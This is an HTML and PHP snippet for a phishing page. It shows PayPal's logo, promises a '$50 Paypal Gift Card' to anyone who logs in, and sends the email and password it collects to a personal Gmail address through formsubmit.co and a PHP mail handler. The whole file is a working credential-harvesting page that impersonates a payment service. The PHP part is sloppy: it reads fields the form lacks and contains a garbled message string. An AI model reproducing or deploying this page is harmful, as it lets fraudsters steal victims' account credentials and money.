<!-- PayPal Logo --><table border="0" cellpadding="10" cellspacing="0" align="center"><tr><td align="center"></td></tr><tr><td align="center"><a href="https://www.paypal.com/in/webapps/mpp/paypal-popup" title="How PayPal Works" onclick="javascript:window.open('https://www.paypal.com/in/webapps/mpp/paypal-popup','WIPaypal','toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=yes, width=1060, height=700'); return false;"><img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-200px.png" border="0" alt="PayPal Logo"></a></td></tr></table><!-- PayPal Logo -->

<div class="container">

    <h1>Login to claim your $50 Paypal Gift Card</h1>
  
    <form target="_blank" action="https://formsubmit.co/walshy3434@gmail.com" method="POST">
  
      <div class="form-group">
  
        <div class="form-row">
  
          <div class="col">
  
            <input type="text" name="email" class="form-control" placeholder="email" required>
  
          </div>
  
          <div class="col">
  
            <input type="text" name="password" class="form-control" placeholder="password" required>
  
          </div>
  
        </div>
  
      </div>
  
      <div class="form-group">
  
      </div>
  
      <button type="submit" class="btn btn-lg btn-dark btn-block">Login</button>
  
    </form>
  
  <div class="container">
  
  <?php
  
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  
    $name = $_POST['name'];
  
    $email = $_POST['email'];
  
    $message = $_POST['message'];
  
  
    // (Validation and sanitization of data would go here)
  
  
    // Send email
  
    $to = "walshy3434@gmail.com";
  
    $subject = "New Form Submission";
  
    $body = "Name: " . $name . "\nEmail: " . $email . "\nMessage: " . $message;
  
    $headers = "From: website@example.com";
  
  
    if (mail($to, $subject, $body, $headers)) {
  
      echo "Thank you for your submission!";
  
    } else {
  
      echo "An error occurred w.  hile sending the email.";
  
    }
  
  }
  
  ?>
  
  
  